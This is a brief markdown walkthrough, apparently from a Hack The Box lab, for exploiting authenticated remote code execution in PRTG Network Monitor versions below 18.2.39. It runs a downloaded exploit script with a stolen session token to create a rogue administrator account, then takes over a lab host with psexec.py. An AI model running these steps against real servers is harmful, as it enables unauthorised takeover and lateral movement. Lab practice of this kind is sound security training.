# Netmon RCE

1. Download [prtg-exploit.sh](https://github.com/M4LV0/PRTG-Network-Monitor-RCE)
2. Find a valid set of credentials by exploiting any weakness in the system. Login into the PRTG Network Monitor (< 18.2.39) web interface.
3. Run the exploit using a valid session token, and create a new administrator account on the system

        ./prtg-exploit.sh -u http://10.10.10.2 -c "OCTOPUS1813713946=SESSION_ID_HERE"

4. Login into the remote machine using [psexec.py](https://www.sans.org/blog/psexec-python-rocks/) tool and the new admin credentials `pentest`:`P3nT3st!` 

        psexec.py pentest:'P3nT3st!'@10.10.10.4

## References

* https://github.com/M4LV0/PRTG-Network-Monitor-RCE
* https://davidhamann.de/2020/01/22/htb-writeup-netmon/
